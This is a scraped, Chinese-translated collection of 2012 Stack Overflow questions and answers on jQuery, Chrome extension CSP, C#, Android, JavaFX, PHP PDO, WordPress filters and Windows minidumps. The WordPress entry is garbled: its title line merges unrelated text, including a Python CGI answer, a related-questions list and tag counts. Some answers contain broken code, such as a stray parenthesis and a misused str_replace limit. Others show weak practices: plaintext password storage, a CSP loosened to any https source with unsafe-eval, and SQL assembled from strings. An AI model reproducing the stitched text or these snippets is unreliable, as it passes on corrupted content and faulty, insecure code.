var idClient = $('.popup-chat-header').attr("id"); // a client ID

// loop through a list of ID
$('#clientList li > a').each(function(){
    var newIdList = $(this).attr("id"); 
}); 
```

我试过 :contains() Selector, `(newIdList:contains(idClient)).remove()`，但似乎我没有以正确的方式实现它？任何提示表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:36:20.407

您是否尝试过类似的方法而不是 $.each 循环：

```
$('#' + idClient).parent('li').remove(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:46:35.287

如果您有要删除的元素的 ID，这就是您所需要的：

```
$('#id').remove(); 
```

可以在这里看到一个示例 jsFiddle：http: [//jsfiddle.net/RLLR2/](http://jsfiddle.net/RLLR2/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-12T14:34:39.247

尝试像这样更改您的选择器

```
$('li#clientList > a').each(function(){

        }); 
```

此外，您最好使用类，ID 在页面中应该是唯一的。

如果你使用类，那么最好试试这个

```
$('li.clientList > a').each(function(){
            var newIdList = $(this).attr("id"); // this should give you the ID of all the DOM with class clientList
        }); 
```

# google-chrome - 如何使用内容安全策略 -CSP 允许来自每个网站的远程脚本？

> ID：13841859
> 
> 赞同：1
> 
> 时间：2012-12-12T14:29:29.987
> 
> 标签：google-chrome, google-chrome-extension, content-security-policy

我从以下网址阅读了内容安全政策：http: [//developer.chrome.com/extensions/contentSecurityPolicy.html](http://developer.chrome.com/extensions/contentSecurityPolicy.html)

那里提到：“如果您需要一些外部 JavaScript 或对象资源，您可以通过将应该接受脚本的安全来源列入白名单来在有限程度上放宽政策”

该示例显示您需要在 manifest.json 中添加这一行：

```
"content_security_policy": "script-src 'self' https://example.com; object-src 'self'" 
```

但是，如果我不仅要支持[https://example.com](https://example.com)，还要支持每个网站？顺便说一句 - 是否也可以包括“评估的 JavaScript”：`'unsafe-eval'`到那个？我应该写什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:47:11.513

您引用的页面明确指出，“*由于中间人攻击在 HTTP 上是微不足道且无法检测到的，因此这些来源将不被接受。* ”因此，`http:`来源是正确的。您可以使用纯协议源将 Chrome 扩展程序允许的所有安全来源列入白名单：`script-src 'self' https:`. 这是您在 Chrome 扩展程序中可以做的最好的事情：在整个网络上，您可以将`script-src http: https:`.

对于另一个问题，`'unsafe-eval'`现在允许在扩展中。在以前的 Chrome 版本中，这是不允许的，但谷歌最近似乎改变了他们的立场。

# javascript - 在子字符串中拆分数组并在 div 中回显它们，jQuery

> ID：13841862
> 
> 赞同：1
> 
> 时间：2012-12-12T14:29:39.443
> 
> 标签：javascript, arrays

我正在编写一个简单的计数器，它使用当前日期并向其添加一些数字。我希望最终数字的每个数字都显示在自己的 div 中，以便我可以设置它们的样式。这是我正在使用的代码。我得到一个 'Undefined' is not a function (evalating('y.split("")') 错误，所以我不知道我制作的代码是完全损坏还是这条线不起作用。

```
var counter = setInterval(timedCount,2000);
    function timedCount()
        {
        var x;
        var y;
        var arrDigit;
        var d=new Date();
        x=d.getTime();
        y=(Math.floor((x-928713600000)/1000))*16-61447952;
        var arrDigit = y.split(""); // this is the error line
        jQuery.each(arrDigit, function(){
                $("#counter").text('<div class="counter-digit">' + this + '</div>');
            });
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:35:12.130

你的 y 是一个整数。你需要把它变成字符串。

尝试：

```
function timedCount()
{
    var x, y, arrDigit;
    var html='';
    x = new Date().getTime();
    y=(Math.floor((x-928713600000)/1000))*16-61447952;
    var arrDigit = y.toString().split(""); // this is the error line

    $(arrDigit).each(function(){
        html += '<div class="counter-digit">' + this + '</div>');
    });
    $("#counter").html(html);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:34:13.070

split 是一个使用字符串（不是数组或 int）并给出数组的函数：

```
var s = "1,2,3";
console.log(s.split(",")); // ["1", "2", "3"] 
```

我会给每个使用 push() 创建的 jquery 数组：

```
var a = [];
a.push(1);
a.push(2);
a.push(3);
console.log(a); // [1,2,3] 
```

# c# - 使用 readline 方法从文本中获取指定的行

> ID：13841863
> 
> 赞同：0
> 
> 时间：2012-12-12T14:29:38.977
> 
> 标签：c#

我想使用 ReadLine 方法从文本中获取指定的行

这是我的代码

```
for (int p = 0; p < 100; p++)
{
    var files = await ApplicationData.Current.LocalFolder.GetFileAsync(logid.Text + ".txt");
    var lines = await FileIO.ReadLinesAsync(files);
    var pattern = sm.SelectedItem.ToString();
    var sline = lines[p].Contains(pattern);

    lv.items.add(lines[sline]);
} 
```

问题是`var sline`没有转换成 int 所以行无法读取它。

实际的程序是仅从选定组合框中的包含行的模式中添加文本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:38:54.993

您的问题是您需要在列表中搜索行匹配模式。您的代码只是查看前 100 行，看看其中是否包含您想要的文本。Contains() 方法返回一个布尔值，而不是字符串。

我不完全确定你为什么要任意循环到 100？您正在阅读的文件是否总是正好有 100 行？我认为您正在寻找更多类似的东西？您可以完全放弃循环。

```
var files = await ApplicationData.Current.LocalFolder.GetFileAsync(logid.Text + ".txt");
var lines = await FileIO.ReadLinesAsync(files);
var pattern = sm.SelectedItem.ToString();

// try to look up a line in the list the has the pattern we're looking for in it.
var targetLine = lines.FirstOrDefault(line => line.Contains(pattern));
if (!string.IsNullOrEmpty(targetLine))
    lv.items.add(targetLine); 
```

如果您可能有超过 1 行与模式匹配，您将需要使用 linq 的 Where() 迭代所有这些结果。

```
foreach (string line in lines.Where(line => line.Contains(pattern))
    lv.items.add(line); 
```

# ios - 同步方法 - Objective C

> ID：13841864
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:29:39.630
> 
> 标签：ios, restkit

我使用 reskit 来使用 webservice 我有以下代码：

第一行：从 Web 服务获取 Token

```
 tokenID = [self getTokenID]; 
```

第二行从同一个 Web 服务获取 JSON

```
[self sendRequest:tokenID]; 
```

但是当执行程序时.. tokenID 还没有为第二行准备好......然后我得到 401 错误（未经授权）

是否可以同步两种方法？例如：

当“getTokenID”方法完成后，执行第二个方法“sendRequest:tokenID”

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:50:07.737

我认为您在 getTokenID 中使用了异步调用当我查看 Restkit 的文档时，您的代码中应该有这样的内容：

```
[operation setCompletionBlockWithSuccess:^(RKObjectRequestOperation *operation,     RKMappingResult *result) {
 ** CODE TO EXECUTE AFTER THE REQUEST IS FINISHED **
} failure:nil]; 
```

在那里，在完成块中，您可以从结果中获取令牌并执行您的

```
[self sendRequest:tokenID]; 
```

对不起，我含糊不清，但我需要在 getTokenID 中查看您的代码，以便为您提供更好的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:37:26.677

我不认为`[self getTokenID]`网络服务调用。我认为您没有显示的其他一些代码正在执行请求。执行请求时，它可以是异步的。在这种情况下，当您想要它时，tokenID 可能还没有准备好。

所以我的建议是：寻找正在执行请求的代码，并找到一种方法来挂钩它，以便在请求完成时得到通知。它可以是委托或块的形式。

# dll - 如何在dll之间发送消息

> ID：13841870
> 
> 赞同：0
> 
> 时间：2012-12-12T14:29:51.943
> 
> 标签：dll, messaging

我正在创建一个具有以下特征的应用程序：

*   一个基于对话框的 GUI，它使用 dll 的 n 个实例（让我们调用它`mainLib`）。
*   该`mainLib`dll 使用另一个 dll（让我们调用它`commManager`）来管理与另一个应用程序的 TCP 通信。

我的问题是如何`commManager`通知`mainLib`它收到的某些消息。

我想类似的东西`PostThreadMessage()`可能是解决方案，但我如何在 dll 中实现它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:46:53.637

据推测， commManager 在它自己的线程上运行。mainLib 需要创建一个消息队列，如此[处](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644946%28v=vs.85%29.aspx)所述。当 mainLib 创建 commManager 时，它必须将其线程 ID 传递给它。

如果你想阻塞，另一种选择是使用回调。让 mainLib 向 commManager 传递一个函数指针。

# android - 在android中，除非另一个实例正在运行，否则如何启动一个新的活动，然后激活旧的？

> ID：13841871
> 
> 赞同：0
> 
> 时间：2012-12-12T14:29:56.610
> 
> 标签：android, android-layout, android-intent, android-activity

本质上，我的应用程序将有 4 个活动。A B C D。A 到 C A-->C

C可能想去D，回到C，回到D。或者这条路径中的任何地方。B <--> C <---> D

我有理由相信这每次都会产生一个新的活动，这会导致同一活动的多个堆栈。例如，在 C 和 D 3x 之间来回移动将导致 C 进行 3 次实时活动，D 进行 3 次活动。

问题是如果需要创建一个新活动，我如何才能做到这一点，但如果已经创建了一个，它将移动到显示以前的生成。C(1)-->D(1)-->C(1) 而不是 C(1)-->D(1)-->C(2)

或者更简单地说，如果我想用按钮在 A 和 B 之间来回切换，但又不想创建不断增加的实例堆栈怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:41:39.960

我认为您正在寻找 FLAG_ACTIVITY_SINGLE_TOP。请看这个答案：

[https://stackoverflow.com/a/3283118/1369222](https://stackoverflow.com/a/3283118/1369222)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:35:06.347

我想你正在寻找的是

[http://developer.android.com/guide/topics/manifest/activity-element.html#lmode](http://developer.android.com/guide/topics/manifest/activity-element.html#lmode)

您可以在其中标记您的活动以仅启动单个实例或新任务

# iphone - 按字母顺序排列数组

> ID：13841873
> 
> 赞同：1
> 
> 时间：2012-12-12T14:30:01.800
> 
> 标签：iphone, arrays, sorting, tableview

我有一个包含很多不同数据的 json 数据库。我将这些数据保存在一个数组中，现在我想按字母顺序对其进行排序。有人可以帮我怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:38:44.683

```
 NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"Attribute Name" ascending:NO];
  NSArray *sortDescriptors = [[NSArray alloc] initWithObjects:sortDescriptor, nil];
  [request setSortDescriptors:sortDescriptors]; 
```

# c# - 如何在 WP7 APP 中逐行读取文本文件？

> ID：13841877
> 
> 赞同：0
> 
> 时间：2012-12-12T14:30:18.693
> 
> 标签：c#, windows-phone-7

我正在编写一个非常简单的 WP7 应用程序。它会通过一种记事本。我的任务是为用户创建一个帐户-我通过将数据保存在文本文件中来做到这一点。我不知道如何从文本文件中读取登录名和密码。当然最好的解决方案是数据库，但我没有足够的技能来做到这一点。

这是我的代码。

读取和保存：

```
 private void addUserToFile()
    {
        string fileName = "Logins.txt";

        using (var isoStorage = IsolatedStorageFile.GetUserStoreForApplication())
        {
            using (var isoStream = new IsolatedStorageFileStream(fileName, FileMode.Append, isoStorage))
            {
                // opens the file and writes to it.
                using (var fileStream = new StreamWriter(isoStream))
                {
                    fileStream.WriteLine(typeLogin.Text+"\t"+typePassword.Password);

                }
            }

            NavigationService.Navigate(new Uri("/MainPage.xaml", UriKind.RelativeOrAbsolute));
        }
    } 
```

最后从文本文件中读取（不知道如何逐行迭代，登录名和密码由 TAB 分隔）：

```
private void bGoToPage2_Click(object sender, RoutedEventArgs e) //przechodzenie na druga strone
        {

        if (string.Equals(passwordBox1.Password,passwordBox2.Password))
        {
            MessageBox.Show("Passwords match!");

            if (Login1.Text == "admin") //how change it to reading from file????
            {

                NavigationService.Navigate(new Uri("/Passwords.xaml?param=" + Login1.Text, UriKind.RelativeOrAbsolute));
            }
            else
            {
                MessageBox.Show("Nie znaleziono użytkownika");
            }
        }
        else
        {
            MessageBox.Show("Passwords do not match!");
            NavigationService.Navigate(new Uri("/MainPage.xaml", UriKind.RelativeOrAbsolute));
        }

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T21:29:22.070

如果你想阅读，只需将 writer 类替换为 reader 类。

```
// opens the file and writes to it.
using (var fileStream = new StreamReader(isoStream))
{
    var login = fileStream.ReadLine();
    var password = fileStream.ReadLine();
} 
```

您现在可以将登录名和密码写入单独的行。

希望这可以帮助。尽管我不建议以明文形式保存用户名和密码。

# c# - 即时将字符串数组转换为枚举

> ID：13841880
> 
> 赞同：11
> 
> 时间：2012-12-12T14:30:27.273
> 
> 标签：c#, arrays, winforms, enums, propertygrid

我将一个绑定`enum`到这样的属性网格：

```
public enum myEnum
{
    Ethernet,
    Wireless,
    Bluetooth
}

public class MyClass
{
    public MyClass()
    {
        MyProperty = MyEnum.Wireless;
    }

    [DefaultValue(MyEnum.Wireless)]
    public MyEnum MyProperty { get; set; }
}

public Form1()
{
    InitializeComponent();
    PropertyGrid pg = new PropertyGrid();
    pg.SelectedObject = new MyClass();
    pg.Dock = DockStyle.Fill;
    this.Controls.Add(pg);
} 
```

我的问题：我在程序运行时即时获取数据。我阅读了网络适配器，然后将适配器名称存储为`myArray`：

```
string[] myArray = new string[] { };
myArray[0] = "Ethernet";
myArray[1] = "Wireless";
myArray[2] = "Bluetooth"; 
```

是否可以使用 c# 即时转换`myArray`为？`myEnum`谢谢你。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-12T14:49:00.060

当然！这就是你所需要的：

```
IEnumerable<myEnum> items = myArray.Select(a => (myEnum)Enum.Parse(typeof(myEnum), a)); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-02-14T14:33:58.127

如果您的源数据不是完全可靠的，您可能需要考虑仅转换可以实际解析的项目，使用`TryParse()`and `IsDefined()`。

从字符串数组中获取 myEnums 数组可以通过以下代码执行：

```
myEnum [] myEnums = myArray
    .Where(c => Enum.IsDefined(typeof(myEnum), c))
    .Select(c => (myEnum)Enum.Parse(typeof(myEnum), c))
    .ToArray(); 
```

请注意，`IsDefined()`仅适用于单个枚举值。如果您有`[Flags]`枚举，则组合无法通过测试。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-12T14:32:09.990

你会想要使用：http `Enum.Parse`: [//msdn.microsoft.com/en-us/library/essfb559.aspx](http://msdn.microsoft.com/en-us/library/essfb559.aspx)

`MyProperty = (myEnum)Enum.Parse(typeof(myEnum), myArray[0]);`

我猜你想如何将它与你的阵列一起使用取决于你的需要。

编辑：无论如何，首先将您的适配器名称作为枚举存储到您的数组中是否可行？数组*必须*是字符串有什么原因吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T14:50:35.787

如果要获取枚举值的名称，则不必使用 Parse。不要使用`.ToString()`，改用这个。例如，如果我想返回`Ethernet`，我会执行以下操作：

```
public enum myEnum
{
    Ethernet,
    Wireless,
    Bluetooth
} 
```

在你的主类中添加这行代码：

```
var enumName = Enum.GetName(typeof(myEnum), 0); //Results = "Ethernet" 
```

如果你想枚举枚举值，你可以这样做来获取值：

```
foreach (myEnum enumVals in Enum.GetValues(typeof(myEnum)))
{
    Console.WriteLine(enumVals);//if you want to check the output for example
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T14:31:57.490

`Enum.Parse`在循环中用于数组中的每个元素。

# php - wordpress - functions.php - preg_replace - 我对 wordpress 的帖子有疑问。使用在wordpress上自动发布的外部博客的代码嵌入功能，html代码弄乱了我的样式。 我确实有以下代码：[![DIFFERENT VARIABLES](DIFFERENT VARIABLES "DIFFERENT VARIABLES")](DIFFERENT VARIABLES) SEVERAL -TAGS目标是摆脱带有样式属性的第二个并摆脱

. 最好的方法是 function.php 的函数，因为我确实有很多帖子。 任何人都可以帮助我吗？我可以做一些 html 编码，但这远远超出了我的技能。 我会采用微框架方法以防万一您的需求发生变化-您永远不知道，它最终可能成为一个应用程序，而只是一个基本的转储......也许最简单的（和老式的方式！？）是使用 CGI： 复制您的脚本并print 'Content-Type: text/plain\n'在任何其他输出之前包含sys.stdout 将该脚本放在apache2可以访问的地方（例如您的cgi-bin） 确保脚本是可执行的 确保.py已添加到 Apache CGI 处理程序 但是 - 我不认为这将是一个了不起的优势（至少从长远来看） phphtmlwordpressfunction 4 2 回答 2 This answer is useful 1 function my_function($content) { $div = '

'; // Make sure the offending div is there. if (strpos($content, $div) !== false) { // Remove div. $content = str_replace($div, '', $content); // Remove one ending div tag. $content = str_replace('', '', $content, 1); // Remove the p, br. $content = str_replace('

', '', $content, 1); } return $content } add_filter('the_content', 'my_function'); 将此添加到您的functions.php。 于 2012-12-12T15:28:55.410 回答 This answer is useful 0 您是否尝试过 jQuery 命令来删除它，例如jQuery('.entry-content br').remove()？ 在 php 级别，您可以使用the_content过滤器来更改内容。 于 2012-12-12T15:09:45.080 回答 Related 2 ajax - ajaxStop 触发两次......有时 1 oracle - sqlloader日期转换：数据类型不一致 1 linux - 如何理解虚拟到物理的翻译？ 1 java - 固定文本字段上的日期分隔符 (dd-mm-YYYY) 9 android - 通知的振动和声音默认设置 3 r - 删除具有相似方差的列 1 eclipse - 过度使用和忽略的 PyDev 断点 1 android - 通讯录设计建议 1 leaflet - 传单：如何处理重叠线？ 2 java - 使用本地电脑作为服务器 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641 

 > ID：13841883
> 
> 赞同：2
> 
> 时间：
> 
> 标签：php, html, wordpress, function

我对 wordpress 的帖子有疑问。使用在wordpress上自动发布的外部博客的代码嵌入功能，html代码弄乱了我的样式。

我确实有以下代码：

```
 <div class="entry-content">
     <div style="width:450px;margin:0 auto">
      <div style="position:relative;">
       <a target="_blank" href="DIFFERENT VARIABLES">
        <img width="???" alt="DIFFERENT VARIABLES" src="DIFFERENT VARIABLES" title="DIFFERENT VARIABLES" height="???" />
       </a>
      </div>
     </div>
     <p><br/>
     <div style="text-align:center"><small>SEVERAL <a>-TAGS</small></div>
    </div> 
```

目标是摆脱`<div>`带有样式属性的第二个并摆脱`<p><br/>`.

最好的方法是 function.php 的函数，因为我确实有很多帖子。

任何人都可以帮助我吗？我可以做一些 html 编码，但这远远超出了我的技能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:28:55.410

```
function my_function($content) {
    $div = '<div style="width:450px;margin:0 auto">';
    // Make sure the offending div is there.
    if (strpos($content, $div) !== false) {
         // Remove div.
         $content = str_replace($div, '', $content);
         // Remove one ending div tag.
         $content = str_replace('</div>', '', $content, 1);
         // Remove the p, br.
         $content = str_replace('<p><br/>', '', $content, 1);
    }
    return $content
}
add_filter('the_content', 'my_function'); 
```

将此添加到您的functions.php。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T15:09:45.080

您是否尝试过 jQuery 命令来删除它，例如`jQuery('.entry-content br').remove()`？

在 php 级别，您可以使用`the_content`过滤器来更改内容。

# java - 将 System.out 重定向到 JavaFX 中的 TextArea

> ID：13841884
> 
> 赞同：18
> 
> 时间：2012-12-12T14:30:36.720
> 
> 标签：java, textarea, javafx, io-redirection, printstream

## 更新：

仍然有同样的问题，主应用程序代码的修改来源：http: [//pastebin.com/fLCwuMVq](http://pastebin.com/fLCwuMVq)

一定有一些东西`CoreTest`会阻止 UI，但它会做各种各样的事情（异步 xmlrpc 请求、异步 http 请求、文件 io 等），我试着把它全部放进去`runLater`，但它没有帮助。

## 更新 2：

我验证了代码运行并正确产生输出，但 UI 组件无法显示它很长时间

## 更新 3：

好的，我修好了。我不知道为什么，但没有关于 JavaFX 的指南这么说，这非常重要：

**始终将程序逻辑放在与 Java FX 线程不同的线程中**

* * *

我曾与 Swing 一起使用，`JTextArea`但由于某种原因，它不适用于 JavaFX。

我尝试调试它并`.getText()`在每次写入后返回似乎正确写入的字符，但`TextArea`GUI 中的实际显示没有文本。

我忘了以某种方式刷新它吗？

```
TextArea ta = TextAreaBuilder.create()
    .prefWidth(800)
    .prefHeight(600)
    .wrapText(true)
    .build();

Console console = new Console(ta);
PrintStream ps = new PrintStream(console, true);
System.setOut(ps);
System.setErr(ps);

Scene app = new Scene(ta);
primaryStage.setScene(app);
primaryStage.show(); 
```

和`Console`班级：

```
import java.io.IOException;
import java.io.OutputStream;

import javafx.scene.control.TextArea;

public class Console extends OutputStream
{
    private TextArea    output;

    public Console(TextArea ta)
    {
        this.output = ta;
    }

    @Override
    public void write(int i) throws IOException
    {
        output.appendText(String.valueOf((char) i));
    }

} 
```

注意：这是基于[此答案](https://stackoverflow.com/a/343007/677139)的解决方案，我删除了我不关心但未修改的位（除了从 Swing 更改为 JavaFX），它具有相同的结果：数据写入 UI 元素，没有数据显示屏幕。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-12T14:34:47.943

您是否尝试在 UI 线程上运行它？

```
public void write(final int i) throws IOException {
    Platform.runLater(new Runnable() {
        public void run() {
            output.appendText(String.valueOf((char) i));
        }
    });
} 
```

**编辑**

我认为您的问题是您在 GUI 线程中运行了一些长任务，这将冻结所有内容，直到它完成。我不知道是什么

```
CoreTest t = new CoreTest(installPath);
t.perform(); 
```

确实如此，但如果需要几秒钟，您的 GUI 将不会在这几秒钟内更新。您需要在单独的线程中运行这些任务。

作为记录，这很好用（我已经删除了文件和 CoreTest 位）：

```
public class Main extends Application {

    @Override
    public void start(Stage primaryStage) throws IOException {

        TextArea ta = TextAreaBuilder.create().prefWidth(800).prefHeight(600).wrapText(true).build();
        Console console = new Console(ta);
        PrintStream ps = new PrintStream(console, true);
        System.setOut(ps);
        System.setErr(ps);
        Scene app = new Scene(ta);

        primaryStage.setScene(app);
        primaryStage.show();

        for (char c : "some text".toCharArray()) {
            console.write(c);
        }
        ps.close();
    }

    public static void main(String[] args) {
        launch(args);
    }

    public static class Console extends OutputStream {

        private TextArea output;

        public Console(TextArea ta) {
            this.output = ta;
        }

        @Override
        public void write(int i) throws IOException {
            output.appendText(String.valueOf((char) i));
        }
    }
} 
```

# php - PHP PDO 转换

> ID：13841886
> 
> 赞同：0
> 
> 时间：2012-12-12T14:30:45.073
> 
> 标签：php, mysql, pdo

我正在将 PDO 合并到我的代码中，但我发现很难完成我以前喜欢做的相同任务。我觉得我可能错过了什么。有人可以就以下代码提供一些指导吗？

首先，我将以下函数转换为使用 PDO：

```
public function fetchBgnew($whr, $limit){

            $db = Core::getInstance();              
            $res = $db->dbh->prepare("SELECT p.id,p.bg,p.bg_desc,p.bg_id,p.user_id, p.pl_id,p.domainurl,p.type,p.price FROM ".USERS_BG." as p left join ".USERS." as u on p.user_id=u.id WHERE u.status !=0 and :whr :limit");
            $res->execute(array(':whr'=>$whr,':limit'=>$limit));                
            $res->fetchAll(PDO::FETCH_ASSOC);

            $cnt = $db->dbh->prepare("SELECT p.id FROM ".USERS_BG." as p left join ".USERS." as u on p.user_id=u.id WHERE u.status !=0 and :whr");
            $cnt->execute(array(':whr'=>$whr));             
            $cnt->rowCount();

            return $result = array("data"=>$res, "count"=>$cnt);
        } 
```

其次，我想调用该函数，但我之前使用的之前的代码采用了一个完整的字符串语句，如下所示：

```
 $bgdataarr = $bgObj->fetchBgnew(" p.pl_id IN (".@implode(',',$barr).") and p.status =1 order by p.id desc", " LIMIT $limit_start,$page_records"); 
```

我已经与 PDO 合作了大约 3 天，我的印象是您无法传递要准备的字符串语句，或者至少我不知道如何传递。

1.转换第二个函数调用的正确方法是什么？

2.是否可以将函数转换为能够像以前一样传递我想要的任何参数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:07:27.457

如评论中所述，您不能将包含列：值对的数组作为 PDOStatement 参数传递。

您需要做的是动态创建整个语句。

假设您有以下数组：

```
$whr = array('username' => '12345', 'password' => 'lorem ipsum'); 
```

你的陈述看起来像这样：

```
$stmt = $pdo->prepare("SELECT * FROM users WHERE :whr"); 
```

将数组绑定到参数会产生无效的 SQL（假设您对数组进行内爆，因此其结果是字符串）。

您需要做的是动态创建整个语句。

```
$query[] = "SELECT * FROM users WHERE";

foreach($whr as $column => $value)
{
    $query[] = "$column = :$column";
}

$stmt = $pdo->prepare(implode(' AND ', $query));

// Naturally, you'll have to bind parameters somehow as well
foreach($whr as $column => $value)
{
    $stmt->bindValue($column, $value);
}

$stmt->execute(); 
```

# javascript - 如何在 Javascript 中打破 jQuery.delay？

> ID：13841887
> 
> 赞同：6
> 
> 时间：2012-12-12T14:30:45.807
> 
> 标签：javascript, jquery, html

> **可能重复：**
> [.delay() 和 .setTimeout()](https://stackoverflow.com/questions/7407935/delay-and-settimeout)

有没有办法在这里打破和停止 javascript 延迟？

我希望用户单击按钮时，此延迟将停止并且不会像此处那样执行预期的代码

```
 $(#my_id).html('write my string here').delay(12000).fadeOut(1000) ; 
```

那么当用户单击带有 id 的按钮时，如何阻止它不淡出我的字符串`'my_button'`？任何帮助深表感谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T14:33:50.303

正如[jQuery.delay](http://api.jquery.com/delay/)的文档明确指出的那样，您不能取消使用该函数配置的延迟。

> [...] 因为它是有限的——例如，它不提供取消延迟的方法——.delay() 不能替代 JavaScript 的原生 setTimeout 函数，它可能更适合某些用例 [ ...]

使用常规 javascript [setTimeout](https://developer.mozilla.org/en-US/docs/DOM/window.setTimeout)可以轻松取消操作。例如，您的代码可以转换为：

```
$("#my_id").html('write my string here');
var myTimeoutId = setTimeout(function() {
    $("#my_id").fadeOut(1000);
}, 12000);

// to somewhere else cancel that timeout use clearTimeout function like so:
clearTimeout(myTimeoutId); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:34:25.923

如果您[查看文档](http://api.jquery.com/delay/)，显然不是。建议`setTimeout`可以替代您需要的东西。

> .delay() 方法最适合在排队的 jQuery 效果之间进行延迟。因为它是有限的——例如，它不提供取消延迟的方法——.delay() 不能替代 JavaScript 的本机 setTimeout 函数，这可能更适合某些用例。

# c++ - MiniDumpWriteDump 和写入管道会导致死锁

> ID：13841890
> 
> 赞同：0
> 
> 时间：2012-12-12T14:30:59.440
> 
> 标签：c++, windows, pipe, minidump

在我的应用程序中，我`Unnamed Pipes`用作函数的输出`MiniDumpWriteDump`- 我不想实际创建文件，只需将 MiniDump 写入内存缓冲区。

从另一个线程调用从管道读取字节的方法。当我调用`MiniDumpWriteDump`函数时，`ReadFile`and`MiniDumpWriteDump`函数永远不会返回。

我试图检查是否是句柄错误或管道尺寸太小的问题，但是当我使用简单的`WriteFile`功能时，一切似乎都很好（即使管道尺寸小于写入的字符串）。

这是我的一段代码：

```
void CCrashHandler::PipeDump()
{
    ...
    m_ePipeEnd = CreateEvent( 
      NULL, // default security attribute
      TRUE, // manual reset event 
      TRUE, // initial state = signaled 
      NULL);   // unnamed event object 
    m_ePipeStart = CreateEvent( 
      NULL, // default security attribute
      TRUE, // manual reset event 
      TRUE, // initial state = signaled 
      NULL);   // unnamed event object 

    if(m_ePipeEnd == NULL || m_ePipeStart == NULL)
    {

        return;
    }

    // Create pipe handles
    HANDLE readPipe, writePipe;
    if(!CreatePipe(&readPipe, &writePipe, NULL, PIPESIZE))
    {

        return;
    }

    // Load dbghelp.dll
    hDbgHelp = LoadLibrary(_T("dbghelp.dll"));
    if(hDbgHelp==NULL)
    {
        // Error - couldn't load dbghelp.dll

        return;
    }

    // Write minidump to the file
    mei.ThreadId = GetCurrentThreadId();
    mei.ExceptionPointers = pExcPtrs;
    mei.ClientPointers = FALSE;
    mci.CallbackRoutine = NULL;
    mci.CallbackParam = NULL;

    typedef BOOL (WINAPI *LPMINIDUMPWRITEDUMP)(
        HANDLE hProcess, 
        DWORD ProcessId, 
        HANDLE hFile, 
        MINIDUMP_TYPE DumpType, 
        CONST PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, 
        CONST PMINIDUMP_USER_STREAM_INFORMATION UserEncoderParam, 
        CONST PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

    LPMINIDUMPWRITEDUMP pfnMiniDumpWriteDump = 
        (LPMINIDUMPWRITEDUMP)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if(!pfnMiniDumpWriteDump)
    {   
        // Bad MiniDumpWriteDump function
        // Close handles
        CloseHandle(readPipe);
        CloseHandle(writePipe);

        return;
    }
    HANDLE hProcess   = GetCurrentProcess();
    DWORD dwProcessId = GetCurrentProcessId();
    DWORD  dwThreadId = 0;

    ResetEvent(m_ePipeStart);
    ResetEvent(m_ePipeEnd);
    // Create thread to read from pipe
    HANDLE hThreadRead = CreateThread( 
            NULL,              // no security attribute 
            PIPESIZE*2,      // default stack size 
            PipeThreadRead,     // thread proc
            (LPVOID)readPipe,   // thread parameter 
            0,                // not suspended 
            &dwThreadId);       // returns thread ID 

    // Signal start of writing to a pipe
    BOOL bRet = SetEvent(m_ePipeStart);
    BOOL bWriteDump = pfnMiniDumpWriteDump(
        hProcess,
        dwProcessId,
        writePipe,
        m_MiniDumpType,
        &mei,
        NULL,
        &mci);
    /*
           This one works fine!
    wchar_t bufor[100];
    int len=wsprintf(bufor,_T("Hello Client From Server (msg #)\n"));

    bRet=WriteFile(writePipe,bufor,len*sizeof(wchar_t),&m_wPipeBytes,NULL);
    */

    Sleep(100);
    // Signal end of writing to a pipe
    bRet = SetEvent(m_ePipeEnd);

    if(!bWriteDump)
    {   
        // Error writing dump.
        // Close handles
        CloseHandle(readPipe);
        CloseHandle(writePipe);

        DWORD nOSError = ::GetLastError();
        wchar_t buf[1024];
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, nOSError, LANG_USER_DEFAULT, buf, 1024, NULL);

        return;
    }
    //bRet = TerminateThread(hThreadRead, -1);
    CloseHandle(writePipe);
    CloseHandle(readPipe);
    ...
}
// Functions, which handles reading from pipe
DWORD WINAPI CCrashHandler::PipeThreadRead(LPVOID szParams)
{
    HANDLE hPipe = (HANDLE) szParams;
    DWORD sum = 0;
    m_pPipeRead = NULL;
    while(1)
    {
